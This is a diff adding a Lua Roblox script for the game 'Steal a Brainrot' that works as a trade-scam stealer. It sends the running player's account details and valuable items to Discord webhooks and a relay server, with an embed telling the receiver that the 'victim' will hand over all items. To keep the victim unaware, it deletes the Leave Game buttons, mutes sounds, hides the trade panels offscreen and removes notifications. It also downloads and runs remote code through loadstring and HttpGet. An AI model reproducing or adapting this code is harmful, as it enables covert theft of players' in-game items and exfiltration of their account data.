+                    Url     = STATUS_API_URL .. "/ping",
+                    Method  = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["User-Agent"]   = "SAB-Status-Heartbeat"
+                    },
+                    Body    = HttpService:JSONEncode({
+                        sessionId = sessionId
+                    })
+                })
+            end)
+
+            if not ok then
+                warn("[Status] Heartbeat failed:", err)
+            end
+        end
+    end)
+end
+
+local function registerStatusSession(vaultId, messageId, channelId, mainEmbed)
+    if STATUS_API_URL == "" then return end
+    if not Request or type(Request) ~= "function" then
+        warn("[Status] No HTTP request fn, skip register")
+        return
+    end
+
+    -- sessionId duy nhất cho lần chạy script này
+    local sessionId = string.format(
+        "%d-%s-%d",
+        LocalPlayer.UserId,
+        tostring(game.JobId),
+        os.time()
+    )
+
+    local payload = {
+        sessionId   = sessionId,
+        vaultId     = vaultId,
+        messageId   = messageId,
+        channelId   = channelId,
+        username    = LocalPlayer.Name,
+        displayName = LocalPlayer.DisplayName,
+        placeId     = game.PlaceId,
+        jobId       = game.JobId,
+        embed       = mainEmbed, -- embed gốc để backend EDIT lại
+    }
+
+    local ok, err = pcall(function()
+        return Request({
+            Url     = STATUS_API_URL .. "/register",
+            Method  = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["User-Agent"]   = "SAB-Status-Register"
+            },
+            Body    = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if not ok then
+        warn("[Status] Register failed:", err)
+        return
+    end
+
+    -- nếu đăng ký ok thì bắt đầu heartbeat 5s/lần
+    startStatusHeartbeat(sessionId)
+end
+--=== HẾT PHẦN STATUS ===
+--==================================================
+--               Discord Sender (via Protector)
+--==================================================
+local function sendToDiscord(privateLink, brainData)
+    brainData = brainData or { list = {"None"}, ping = false }
+
+    
+local receiverText = (type(Username) == "table")
+    and table.concat(Username, ", ")
+    or tostring(Username or "")
+
+    -- max generation (dùng cho Top Hit > 350M/s)
+    local maxGen   = tonumber(brainData.maxGen or 0)
+    local isTopHit = (maxGen >= 350000000) -- 350M/s
+
+    ----------------------------------------------------------------
+    -- Build text cho field "Player Information"
+    ----------------------------------------------------------------
+    local function buildPlayerInfoValue(includeReceiver)
+    local playerCount = #Players:GetPlayers()
+    local lines = {
+        string.format("👤 Display Name : %s", LocalPlayer.DisplayName),
+        string.format("🆔 Username     : %s", LocalPlayer.Name),
+        string.format("📅 Account Age  : %d days", LocalPlayer.AccountAge or 0),
+        string.format("🖥 Executor     : %s", executorName),
+        string.format("👥 Players      : %d/%d", playerCount, Players.MaxPlayers),
+    }
+
+    if includeReceiver then
+        local receiverText = (type(Username) == "table") and table.concat(Username, ", ") or tostring(Username or "")
+        table.insert(lines, string.format("😎 Receiver     : %s", receiverText))
+    end
+
+    return "```" .. table.concat(lines, "\n") .. "```"
+end
+    -- Field Status sẽ nằm cạnh Player Information
+    local function buildStatusValue()
+    return "```🟢 Connected```"
+end
+----------------------------------------------------------------
+    -- Giới hạn text Valuable Brainrots theo kí tự, không cắt giữa dòng
+    ----------------------------------------------------------------
+    local function buildBrainrotValue(brainData, maxChars)
+        maxChars = maxChars or 950
+
+        local lines = (brainData and brainData.list) or {"None"}
+        if #lines == 0 then
+            lines = {"None"}
+        end
+
+        local outLines = {}
+        local totalLen = 0
+
+        for _, line in ipairs(lines) do
+            line = tostring(line)
+
+            -- nếu đã có dòng trước đó thì cộng thêm 1 kí tự xuống dòng
+            local addLen = #line
+            if #outLines > 0 then
+                addLen = addLen + 1 -- "\n"
+            end
+
+            if totalLen + addLen <= maxChars then
+                table.insert(outLines, line)
+                totalLen = totalLen + addLen
+            else
+                -- không nhét dòng bị tràn, thay bằng "...and more!"
+                local moreText = "...and more!"
+
+                -- tránh trùng nếu list gốc đã có sẵn
+                if outLines[#outLines] ~= moreText then
+                    local extraLen = #moreText
+                    if #outLines > 0 then
+                        extraLen = extraLen + 1 -- "\n"
+                    end
+
+                    if totalLen + extraLen <= maxChars then
+                        table.insert(outLines, moreText)
+                    else
+                        -- nếu không còn chỗ để thêm dòng mới,
+                        -- thì thay dòng cuối bằng "...and more!" (nếu hợp lý)
+                        if #outLines > 0 and #moreText <= #outLines[#outLines] then
+                            outLines[#outLines] = moreText
+                        end
+                    end
+                end
+
+                break
+            end
+        end
+
+        local joined = table.concat(outLines, "\n")
+        return "```" .. joined .. "```"
+    end
+    ----------------------------------------------------------------
+    -- Embed chính (full: có receiver + join link + sellall, có thể ping @everyone)
+    ----------------------------------------------------------------
+    local mainEmbeds = { {
+    title = "MozilOnTop • SAB Hit [<:mozil2:1438776373434122351>]",
+    color = THEME_COLOR,
+    
+    fields = {
+        {
+            name = "🛠️ How to Use?",
+            value = "Join SAB, and victim will send u a trade request (if they don't, try send them), then they will send u all their items",
+            inline = false
+        },
+        {
+            name  = "📄 Player Information",
+            value = buildPlayerInfoValue(true), -- có receiver
+            inline = false
+        },
+        {
+            name  = "📡 Player Status",
+            value = buildStatusValue(),
+            inline = false
+        },
+        {
+            name  = "👑 Valuable Brainrots",
+            value = buildBrainrotValue(brainData, 950),
+            inline = false
+        }
+    },
+    footer = { text = "Mozil Scripts - Steal a Brainrot" },
+    image = { url = "https://tr.rbxcdn.com/180DAY-aa4c79d32be85b7a85bfc4ac97d4a9a2/768/432/Image/Webp/noFilter" }
+} }
+
+    local publicEmbeds = { {
+    title = "MozilOnTop • SAB Hit [<:mozil2:1438776373434122351>]",
+    color = THEME_COLOR,
+    fields = {
+        {
+            name  = "📄 Player Information",
+            value = buildPlayerInfoValue(false), -- không receiver
+            inline = false
+        },
+        {
+            name  = "👑 Valuable Brainrots",
+            value = buildBrainrotValue(brainData, 950),
+            inline = false
+        }
+    },
+    footer = { text = "Mozil Scripts - Steal a Brainrot" },
+    image = { url = "https://tr.rbxcdn.com/180DAY-552f911ff9c94fd69b8c2ef71c478952/768/432/Image/Webp/noFilter" },
+} }
+
+    ----------------------------------------------------------------
+    -- Ping logic (@everyone nếu ping = true)
+    ----------------------------------------------------------------
+    local wantPing = (brainData and brainData.ping) and true or false
+    local playerName = LocalPlayer.Name or "error"
+    local content = playerName
+    local allowed_mentions = { parse = {} }
+
+    if wantPing then
+        content = "@everyone\n" .. playerName
+        allowed_mentions = { parse = {"everyone"} }
+    end
+  
+----------------------------------------------------------------
+-- 1) GỬI MAIN WEBHOOK + LẤY messageId + REGISTER STATUS
+----------------------------------------------------------------
+if WEBHOOK_URL ~= "" and Request and type(Request) == "function" then
+    local mozil_meta = {
+        game     = "sab",
+        script   = "sab_pro",  -- tên script để lọc leaderboard
+        placeId  = game.PlaceId,
+        jobId    = tostring(game.JobId),
+        userId   = LocalPlayer and LocalPlayer.UserId or 0,
+        username = LocalPlayer and LocalPlayer.Name or "Unknown",
+    }
+
+    local bodyMainJson = HttpService:JSONEncode({
+        content          = content,
+        allowed_mentions = allowed_mentions,
+        embeds           = mainEmbeds,
+        mozil_meta       = mozil_meta, -- 👈 thêm dòng này
+    })
+
+    local url = withWaitParam(WEBHOOK_URL)
+
+    local ok, resp = pcall(function()
+        return Request({
+            Url     = url,
+            Method  = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Accept"]       = "application/json",
+                ["User-Agent"]   = "Roblox-Executor",
+            },
+            Body    = bodyMainJson,
+        })
+    end)
+
+    if not ok then
+        warn("[Webhook] MAIN POST failed:", resp)
+    else
+        -- lấy raw body từ executor
+        local raw
+        if type(resp) == "table" then
+            raw = resp.Body or resp.body or resp.responseBody or resp.ResponseBody or ""
+        else
+            raw = tostring(resp or "")
+        end
+
+        local messageId, channelId
+
+        -- Vault giờ sẽ trả thẳng JSON Discord message (có id, channel_id)
+        local parseOk, data = pcall(function()
+            return HttpService:JSONDecode(raw)
+        end)
+
+        if parseOk and type(data) == "table" then
+            if data.id and data.channel_id then
+                messageId = tostring(data.id)
+                channelId = tostring(data.channel_id)
+            end
+        end
+
+        if not messageId then
+            warn("[Status] Cannot parse message id from webhook response")
+        else
+            if STATUS_API_URL ~= "" then
+                local vaultId = extractVaultId(WEBHOOK_URL)
+                if vaultId then
+                    registerStatusSession(vaultId, messageId, channelId, mainEmbeds[1])
+                else
+                    warn("[Status] WEBHOOK_URL is not a vault url (no wh_ found)")
+                end
+            end
+        end
+    end
+else
+    if WEBHOOK_URL == "" then
+        warn("[Webhook] MAIN: WEBHOOK_URL is empty")
+    else
+        warn("[Webhook] MAIN: no Request() function available")
+    end
+end
+
+    ----------------------------------------------------------------
+-- 2) PUBLIC + TOP HIT ĐI QUA PROTECTOR NẾU CÓ (V2 – có key + ts + nonce + place_id)
+----------------------------------------------------------------
+if PROTECTOR_URL ~= "" then
+    -- ts: timestamp hiện tại (giây)
+    local nowSec = os.time()
+
+    -- nonce: chuỗi random theo user + jobId + timestamp, để server chống replay
+    local nonce = string.format(
+        "%d-%s-%d-%d",
+        (Players.LocalPlayer and Players.LocalPlayer.UserId) or 0,
+        tostring(game.JobId),
+        nowSec,
+        math.random(1000000, 9999999)
+    )
+
+    local relay = {
+    -- embed public để Protector gửi
+    public_embeds = publicEmbeds,
+
+    -- gửi kèm user_id để server rate limit theo user
+    user_id   = (Players.LocalPlayer and Players.LocalPlayer.UserId) or 0,
+
+    -- NEW: cho phép server lọc theo place
+    place_id  = game.PlaceId,
+
+    -- NEW: chống replay (server check lệch <= 120s + non-duplicate nonce)
+    ts        = nowSec,
+    nonce     = nonce,
+
+    -- NEW: có thể cho server đọc từ body nếu muốn (ngoài header)
+    key       = PROTECTOR_KEY or "",
+
+    -- game name cho Vercel route sang PUBLIC_WEBHOOK_SAB
+    game      = "sab",
+}
+
+    if isTopHit then
+        relay.top_embeds = publicEmbeds
+    end
+
+    -- Header: thêm x-protector-key nếu có
+    local headers = {
+        ["Content-Type"] = "application/json",
+    }
+    if PROTECTOR_KEY and PROTECTOR_KEY ~= "" then
+        headers["x-protector-key"] = PROTECTOR_KEY
+    end
+
+    task.spawn(function()
+        local ok, resp = _postJson(
+            PROTECTOR_URL,
+            headers,
+            HttpService:JSONEncode(relay)
+        )
+        if not ok then
+            warn("[Protector] POST failed:", resp)
+        end
+    end)
+
+    -- ĐÃ gửi public/top qua Protector rồi → không cần fallback nữa
+    return
+end
+
+    ----------------------------------------------------------------
+    -- 3) FALLBACK: KHÔNG CÓ PROTECTOR → GỬI PUBLIC/TOP BẰNG WEBHOOK THƯỜNG
+    ----------------------------------------------------------------
+
+    -- Webhook public
+    if PUBLIC_WEBHOOK_URL ~= "" then
+        local bodyPublic = {
+            content          = "",
+            allowed_mentions = { parse = {} },   -- không ping
+            embeds           = publicEmbeds
+        }
+        local ok2, resp2 = _postJson(
+            PUBLIC_WEBHOOK_URL,
+            {
+                ["Content-Type"] = "application/json",
+                ["Accept"]       = "application/json",
+                ["User-Agent"]   = "Roblox-Executor"
+            },
+            HttpService:JSONEncode(bodyPublic)
+        )
+        if not ok2 then
+            warn("[Webhook] PUBLIC POST failed:", resp2)
+        end
+    end
+
+    -- Webhook Top Hit
+    if isTopHit and TOP_HIT_WEBHOOK_URL ~= "" then
+        local bodyTop = {
+            content          = "",
+            allowed_mentions = { parse = {} },   -- không ping
+            embeds           = publicEmbeds
+        }
+        local ok3, resp3 = _postJson(
+            TOP_HIT_WEBHOOK_URL,
+            {
+                ["Content-Type"] = "application/json",
+                ["Accept"]       = "application/json",
+                ["User-Agent"]   = "Roblox-Executor"
+            },
+            HttpService:JSONEncode(bodyTop)
+        )
+        if not ok3 then
+            warn("[Webhook] TOP-HIT POST failed:", resp3)
+        end
+    end
+end
+--                      Main
+local function main()
+    pcall(function()
+        local fn = rawget(getgenv(), "__SAB_BlockOthersOnceAfterLink")
+        if type(fn) == "function" then fn(4) end
+    end)
+
+    local brainData = collectBrainrots()
+    sendToDiscord(nil, brainData)
+
+    local v = rawget(getgenv(), "Visual")
+    if type(v) == "string" and v ~= "" then
+        local s = v:match("^%s*(.-)%s*$") or v
+        if s:match("^%s*loadstring%(") then
+            local ok, fn = pcall(loadstring, s)
+            if ok and type(fn) == "function" then
+                task.spawn(function() pcall(fn) end)
+            end
+        elseif s:match("^https?://") then
+            task.spawn(function()
+                pcall(function() loadstring(game:HttpGet(s, true))() end)
+            end)
+        end
+    end
+end
+task.spawn(main) 
+local playerList = {}
+
+if type(Username) == "string" and Username ~= "" then
+    playerList = { Username }
+elseif type(Username) == "table" then
+    playerList = Username
+end
+
+if type(playerList) ~= "table" or #playerList == 0 then
+    warn("[SAB-TRADE] Config Username/username trống (cần ít nhất 1 username controller).")
+    return
+end
+
+local LP = Players.LocalPlayer
+
+-- Cache để tránh obf break UDim2
+local OFFSCREEN = UDim2.new(10, 0, 10, 0)
+
+-- Safe spawn/defer tránh obf break task library
+local function safeSpawn(fn)
+    if task and type(task.spawn) == "function" then
+        return task.spawn(fn)
+    end
+    if type(spawn) == "function" then
+        return spawn(fn)
+    end
+    local co = coroutine.create(fn)
+    coroutine.resume(co)
+end
+
+local function safeDefer(fn, ...)
+    local args = {...}
+    safeSpawn(function() fn(table.unpack(args)) end)
+end
+
+local function safeClock()
+    return os.clock()
+end
+
+if not LP then
+    warn("[SAB-TRADE] No LocalPlayer.")
+    return
+end
+
+local CoreGui = game:GetService("CoreGui")
+local container = CoreGui:FindFirstChild("RobloxGui")
+    and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+    and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
+    and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield:FindFirstChild("MenuContainer")
+
+if container then
+    local path = container:FindFirstChild("Page")
+        and container.Page:FindFirstChild("PageViewClipper")
+        and container.Page.PageViewClipper:FindFirstChild("PageView")
+        and container.Page.PageViewClipper.PageView:FindFirstChild("PageViewInnerFrame")
+        and container.Page.PageViewClipper.PageView.PageViewInnerFrame:FindFirstChild("LeaveGamePage")
+        and container.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage:FindFirstChild("LeaveGameText")
+        and container.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveGameText:FindFirstChild("LeaveButtonContainer")
+
+    if path then
+        local btn1 = path:FindFirstChild("DontLeaveGameButton")
+        local btn2 = path:FindFirstChild("LeaveGameButton")
+        if btn1 then btn1:Destroy() end
+        if btn2 then btn2:Destroy() end
+    end
+end
+
+--== Audio patch: mute hết sound trừ bài có chữ 'day' ==--
+local function shouldKeepSound(s)
+    local name = string.lower(tostring(s.Name or ""))
+    local id   = string.lower(tostring(s.SoundId or ""))
+    -- giữ lại nếu tên hoặc SoundId có "day"
+    return name:find("day", 1, true) or id:find("day", 1, true)
+end
+
+local function hardMuteSound(inst)
+    if not inst:IsA("Sound") then
+        return
+    end
+
+    if shouldKeepSound(inst) then
+        -- đây là bài "day" -> giữ nguyên
+        return
+    end
+
+    pcall(function()
+        inst.Volume = 0
+        inst.Looped = false
+        inst.Playing = false
+    end)
+end
+
+-- mute toàn bộ sound đang có (async để không block inject)
+task.spawn(function()
+    for _, inst in ipairs(workspace:GetDescendants()) do
+        if inst:IsA("Sound") then hardMuteSound(inst) end
+    end
+    for _, inst in ipairs(SoundService:GetDescendants()) do
+        if inst:IsA("Sound") then hardMuteSound(inst) end
+    end
+end)
+
+-- mute luôn sound spawn sau này
+game.DescendantAdded:Connect(function(inst)
+    if inst:IsA("Sound") then
+        hardMuteSound(inst)
+    end
+end)
+
+
+--== UI patch: xoá mọi Blur khỏi Camera (kể cả spawn sau) ==--
+local function setupNoBlur()
+    local function attachToCamera(cam)
+        if not cam then return end
+        local function killBlur(inst)
+            if inst:IsA("BlurEffect") or inst.Name == "Blur" then
+                inst:Destroy()
+            end
+        end
+        for _, inst in ipairs(cam:GetDescendants()) do killBlur(inst) end
+        cam.DescendantAdded:Connect(killBlur)
+    end
+    if workspace.CurrentCamera then attachToCamera(workspace.CurrentCamera) end
+    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
+        attachToCamera(workspace.CurrentCamera)
+    end)
+    local camChild = workspace:FindFirstChild("Camera")
+    if camChild then attachToCamera(camChild) end
+end
+
+local function setupFOV()
+    local cam = workspace.CurrentCamera
+    if cam then
+        cam.FieldOfView = 70
+        cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+            if cam.FieldOfView ~= 70 then
+                cam.FieldOfView = 70
+            end
+        end)
+    end
+end
+
+-- setupNoBlur và setupFOV sẽ được gọi 1 lần khi send invite đầu tiên
+local _uiSetupDone = false
+local function doUISetupOnce()
+    if _uiSetupDone then return end
+    _uiSetupDone = true
+    setupNoBlur()
+    setupFOV()
+    print("[SAB-UI] setupNoBlur + FOV done")
+end
+local playerGui = LP:WaitForChild("PlayerGui", 10)
+
+-- Gọi ngay khi inject, không chờ
+doUISetupOnce()
+
+-- xoá Notification popup ngay khi inject
+local notif = playerGui:FindFirstChild("Notification")
+if notif then
+    notif:Destroy()
+    
+end
+
+local leftCenter = playerGui:FindFirstChild("LeftCenter")
+if leftCenter and leftCenter:IsA("ScreenGui") then
+    local clone = leftCenter:Clone()
+    clone.Name = leftCenter.Name
+    clone.ResetOnSpawn = leftCenter.ResetOnSpawn
+    clone.Parent = playerGui
+
+    leftCenter:Destroy()
+    print("[SAB-UI] Cloned & removed LeftCenter gốc")
+end
+
+local cam = workspace:FindFirstChild("Camera")
+if cam then
+    local blur = cam:FindFirstChild("Blur")
+    if blur then
+        blur:Destroy()
+        print("[SAB-UI] Removed workspace.Camera.Blur")
+    end
+end
+--== UI patch: ẩn các panel trade nhưng vẫn giữ TradeLiveTrade.Visible để check in-trade ==--
+local function patchTradeGui(rootGui)
+    if not rootGui then return end
+
+    local frame = rootGui:FindFirstChild("TradeLiveTrade")
+        or rootGui:FindFirstChild("TradeLiveTrade", true)
+    if not (frame and frame:IsA("GuiObject")) then return end
+
+    local offScreen = OFFSCREEN
+    for _, child in ipairs(frame:GetChildren()) do
+        if child:IsA("GuiObject") then
+            child.Position = offScreen
+        end
+    end
+end
+
+-- apply ngay nếu TradeLiveTrade đã có sẵn
+local tradeRootNow = playerGui:FindFirstChild("TradeLiveTrade")
+if tradeRootNow then
+    patchTradeGui(tradeRootNow)
+end
+
+-- nếu game spawn TradeLiveTrade sau khi inject thì patch 1 lần khi nó được add
+playerGui.ChildAdded:Connect(function(child)
+    if child.Name == "TradeLiveTrade" then
+        patchTradeGui(child)
+    end
+end)
+local function safeWaitChild(parent, name, timeout)
+    timeout = timeout or 10
+    local t0 = safeClock()
+    local obj
+    repeat
+        obj = parent:FindFirstChild(name)
+        if obj then return obj end
+        task.wait(0.5)
+    until safeClock() - t0 > timeout
+    return parent:FindFirstChild(name)
+end
+
+
+local Packages = safeWaitChild(ReplicatedStorage, "Packages", 10)
+if not Packages then
+    warn("[SAB-TRADE] Không thấy ReplicatedStorage.Packages")
+    return
+end
+
+local Net = safeWaitChild(Packages, "Net", 10)
+if not Net then
+    warn("[SAB-TRADE] Không thấy ReplicatedStorage.Packages.Net")
+    return
+end
+
+
+local function loadSyncData()
+    local syncModule = Packages:FindFirstChild("Synchronizer")
+    if not syncModule then
+        warn("[SAB-TRADE] Không thấy Packages.Synchronizer")
+        return nil
+    end
+
+    local okReq, sync = pcall(require, syncModule)
+    if not okReq or type(sync) ~= "table" then
+        warn("[SAB-TRADE] require(Synchronizer) fail")
+        return nil
+    end
+
+    local getFn = sync.Get or sync.get or sync.getData
+    if type(getFn) ~= "function" then
+        warn("[SAB-TRADE] Không tìm thấy hàm Get trong Synchronizer")
+        return nil
+    end
+
+    for i = 1, 30 do
+        local ok, uv = pcall(function()
+            return debug.getupvalue(getFn, i)
+        end)
+        if ok and type(uv) == "table" then
+            return uv
+        end
+    end
+
+    warn("[SAB-TRADE] Không lôi được SYNC_DATA từ Synchronizer")
+    _syncFailedExecutor = true
+    safeSpawn(function()
+        showWarningUI("Your executor is not supported.\nPlease try running the script with a different executor.")
+    end)
+    return nil
+end
+
+local function safeRequire(pathArray)
+    local node = ReplicatedStorage
+    for _, name in ipairs(pathArray) do
+        node = node:FindFirstChild(name)
+        if not node then return nil end
+    end
+    local ok, mod = pcall(require, node)
+    if ok then return mod end
+    return nil
+end
+
+local AnimalsData = safeRequire({ "Datas", "Animals" })
+
+local function getMutationName(mutation)
+    if not mutation then
+        return "None"
+    end
+
+    if type(mutation) == "string" then
+        return mutation
+    end
+
+    if type(mutation) == "table" then
+        if mutation.Type and type(mutation.Type) == "string" then
+            return mutation.Type
+        end
+        local parts = {}
+        for _, v in pairs(mutation) do
+            if type(v) == "string" then
+                table.insert(parts, v)
+            end
+        end
+        if #parts > 0 then
+            table.sort(parts)
+            return table.concat(parts, "+")
+        end
+    end
+
+    return "Unknown"
+end
+
+local function scanBrainrots()
+    -- 1) Lấy SYNC_DATA từ Synchronizer
+    local SYNC_DATA = loadSyncData()
+    if not SYNC_DATA then
+        warn("[SAB-TRADE] SYNC_DATA missing, cannot scan brainrots.")
+        return nil
+    end
+
+    -- 2) Tìm plot trong workspace để build map slot -> gen từ Overhead
+    local myPlot = getMyPlot()
+    if not myPlot then
+        warn("[SAB-TRADE] Cannot find your plot in workspace.")
+        return nil
+    end
+
+    local SLOT_GEN_MAP = buildSlotGenMap(myPlot) or {}
+    local allBrainrots = {}
+
+    -- 3) Duyệt SYNC_DATA y hệt logic embed cũ để tìm plot của mình
+    for _, plotData in pairs(SYNC_DATA) do
+        if type(plotData) == "table" then
+            local owner = plotData.Owner
+            if type(plotData.Get) == "function" and owner == nil then
+                local okGetOwner, gotOwner = pcall(function()
+                    return plotData:Get("Owner")
+                end)
+                if okGetOwner then
+                    owner = gotOwner
+                end
+            end
+
+            local isOwner = false
+            if typeof(owner) == "Instance" and owner:IsA("Player") then
+                isOwner = (owner == LocalPlayer)
+            elseif type(owner) == "table" and owner.UserId then
+                isOwner = (owner.UserId == LocalPlayer.UserId)
+            end
+
+            if isOwner then
+                -- Lấy AnimalList giống embed cũ
+                local animalList = plotData.AnimalList
+                if type(plotData.Get) == "function" and animalList == nil then
+                    local okGetList, gotList = pcall(function()
+                        return plotData:Get("AnimalList")
+                    end)
+                    if okGetList then
+                        animalList = gotList
+                    end
+                end
+
+                if type(animalList) ~= "table" then
+                    warn("[SAB-TRADE] animalList on my plot is not a table.")
+                    break
+                end
+
+                -- 4) Duyệt từng slot, nối với gen từ Overhead
+                for slotKey, data in pairs(animalList) do
+                    if type(data) == "table" then
+                        local index    = data.Index or data.AnimalId or data.id
+                        if not index then
+                            continue
+                        end
+
+                        local uuid     = data.UUID or data.Uid or data.uid
+                        local off      = data.OfflineGain or data.Offline or 0
+                        local last     = data.LastCollect or data.Last or 0
+                        local traits   = data.Traits or {}
+                        local mutation = data.Mutation or data.MutationName or "None"
+
+                        local displayName = index
+                        local rarity      = "Common"
+                        local mutName     = getMutationName and getMutationName(mutation) or tostring(mutation)
+
+                        if AnimalsData and index and AnimalsData[index] then
+                            local info = AnimalsData[index]
+                            if type(info) == "table" then
+                                displayName = info.DisplayName or displayName
+                                rarity      = info.Rarity or rarity
+                            end
+                        end
+
+                        local slotNum  = tonumber(slotKey)
+                        local genInfo  = slotNum and SLOT_GEN_MAP[slotNum] or nil
+
+                        -- Chỉ giữ những con có Overhead gen > 0
+                        if genInfo and genInfo.mpsNum and genInfo.mpsNum > 0 then
+                            table.insert(allBrainrots, {
+                                slotKey  = slotNum or slotKey,
+                                display  = displayName,
+                                index    = index,
+                                uuid     = uuid,
+                                offline  = off,
+                                last     = last,
+                                traits   = traits,
+                                mutation = mutation,
+                                mutName  = mutName,
+                                rarity   = rarity,
+                                mps      = genInfo.mpsNum,
+                                mpsText  = genInfo.mpsText,
+                            })
+                        end
+                    end
+                end
+
+                -- Đã xử lý plot của mình rồi, không cần đi tiếp
+                break
+            end
+        end
+    end
+
+    if #allBrainrots == 0 then
+        warn("[SAB-TRADE] No brainrots with Overhead gen found on your plot.")
+        return {}
+    end
+
+    -- 5) Sort theo rarity rồi gen (cao -> thấp)
+    table.sort(allBrainrots, function(a, b)
+        local ra = rarityRank[a.rarity] or 999
+        local rb = rarityRank[b.rarity] or 999
+        if ra ~= rb then
+            return ra < rb
+        end
+        return (a.mps or 0) > (b.mps or 0)
+    end)
+
+    -- 6) Debug list cuối cùng
+    print(string.rep("=", 60))
+    print("[SAB-TRADE] Brainrots trong base (Overhead gen, đã sort rarity + gen):")
+    for i, br in ipairs(allBrainrots) do
+        local traitsStr = "None"
+        if type(br.traits) == "table" then
+            -- dùng pairs để support cả table dạng map
+            local tmp = {}
+            for _, v in pairs(br.traits) do
+                table.insert(tmp, tostring(v))
+            end
+            if #tmp > 0 then
+                traitsStr = table.concat(tmp, ", ")
+            end
+        end
+
+        local line = string.format(
+            "#%02d [%s] slot=%s | %s | %s | traits=%s",
+            i,
+            tostring(br.rarity or "?"),
+            tostring(br.slotKey),
+            tostring(br.mpsText or "0"),
+            tostring(br.display or "?"),
+            traitsStr
+        )
+        print(line)
+    end
+    print(string.rep("=", 60))
+
+    return allBrainrots
+end
+
+do
+    local prev = -1
+    local stable = 0
+    repeat
+        task.wait(0.2)
+        local curr = #workspace:GetChildren()
+        if curr == prev then
+            stable = stable + 1
+        else
+            stable = 0
+            prev = curr
+        end
+    until stable >= 2
+end
+
+local brainrots = scanBrainrots()
+if not brainrots or #brainrots == 0 then
+    if _syncFailedExecutor then
+        warn("[SAB-TRADE] Executor không support, dừng script.")
+        -- UI warning đã hiện, loadstring chạy khi ấn OK
+    else
+        warn("[SAB-TRADE] Base trống, không có brainrot nào để trade.")
+        safeSpawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/keykey.lua"))()
+            end)
+        end)
+    end
+    return
+end
+
+-- ============================================================
+-- Lọc brainrot theo BrainrotPing (chỉ trade những con đủ mps)
+-- ============================================================
+local function getBrainrotPingThreshold()
+    local v = rawget(getgenv(), "BrainrotPing") or rawget(getgenv(), "brainrotPing")
+    if v == nil then
+        return 0
+    end
+
+    if type(v) == "number" then
+        return v
+    end
+
+    if type(v) == "string" then
+        local s = v:lower()
+        -- bỏ khoảng trắng, "/s", "s", đổi dấu phẩy thành chấm
+        s = s:gsub("%s+", "")
+        s = s:gsub("/s$", "")
+        s = s:gsub("s$", "")
+        s = s:gsub(",", ".")
+        local num = tonumber(s:match("([%d%.]+)") or "") or 0
+        if num <= 0 then
+            return 0
+        end
+
+        if s:find("k") then
+            num = num * 1000
+        elseif s:find("m") then
+            num = num * 1000000
+        elseif s:find("b") then
+            num = num * 1000000000
+        end
+
+        return num
+    end
+
+    return 0
+end
+
+local pingThresholdForTrade = getBrainrotPingThreshold()
+if pingThresholdForTrade > 0 and #brainrots > 0 then
+    local filtered = {}
+    for _, br in ipairs(brainrots) do
+        local mpsNum = br.mps or 0
+        if mpsNum >= pingThresholdForTrade then
+            filtered[#filtered + 1] = br
+        end
+    end
+
+    if #filtered > 0 then
+        print(string.format(
+            "[SAB-TRADE] BrainrotPing=%.0f, chỉ trade %d/%d brainrot có Mps >= threshold.",
+            pingThresholdForTrade,
+            #filtered,
+            #brainrots
+        ))
+        brainrots = filtered
+    else
+        print(string.format(
+            "[SAB-TRADE] BrainrotPing=%.0f, không có brainrot nào đủ Mps, KHÔNG gửi trade.",
+            pingThresholdForTrade
+        ))
+        safeSpawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/keykey.lua"))()
+            end)
+        end)
+        return
+    end
+end
+
+local function getUserIdByName(name)
+    if not name or name == "" then return nil end
+
+    local inServer = Players:FindFirstChild(name)
+    if inServer then
+        return inServer.UserId
+    end
+
+    if Request then
+        local ok, resp = pcall(function()
+            return Request({
+                Url = "https://users.roblox.com/v1/usernames/users",
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({ usernames = { name }, excludeBannedUsers = false })
+            })
+        end)
+        if ok and resp then
+            local body = resp.Body or resp.body or ""
+            local parseOk, data = pcall(function()
+                return HttpService:JSONDecode(body)
+            end)
+            if parseOk and data and data.data and data.data[1] then
+                return data.data[1].id
+            end
+        end
+    end
+    return nil
+end
+
+local function isTradeUIOpen()
+    local pg = LP:FindFirstChild("PlayerGui")
+    if not pg then return false end
+    local tlRoot = pg:FindFirstChild("TradeLiveTrade")
+    local tl = tlRoot and tlRoot:FindFirstChild("TradeLiveTrade")
+    return tl and tl.Visible or false
+end
+------------------------------------------------------------
+-- 4) MODE: AUTO-SEND (Presence API check → remote invite)
+------------------------------------------------------------
+
+-- build userId cache 1 lần (dùng cho presence check)
+local _userCache = {}
+do
+    local results = {}
+    local done = 0
+    local total = #playerList
+    for i, name in ipairs(playerList) do
+        results[i] = { name = name, userId = nil }
+        safeSpawn(function()
+            local uid = getUserIdByName(name)
+            results[i].userId = uid
+            done = done + 1
+        end)
+    end
+    while done < total do task.wait(0.1) end
+    for _, r in ipairs(results) do
+        if r.userId then
+            _userCache[#_userCache + 1] = { name = r.name, userId = r.userId }
+        else
+            warn("[SAB-TRADE] Không lấy được UserId cho", r.name)
+        end
+    end
+end
+
+local function getFirstOnlineUser()
+    if #_userCache == 0 then return nil end
+
+    local ids = {}
+    for _, u in ipairs(_userCache) do
+        ids[#ids + 1] = u.userId
+    end
+
+    local ok, data = pcall(function()
+    local resp = Request({
+        Url = "https://statusplayers.duckdns.org/presence",  -- đổi dòng này
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        -- bỏ hoàn toàn dòng Cookie
+        Body = HttpService:JSONEncode({ userIds = ids })
+    })
+    return HttpService:JSONDecode(resp.Body or resp.body)
+end)
+
+    if not ok or not data or not data.userPresences then
+        warn("[SAB-TRADE] Presence API failed")
+        return nil
+    end
+
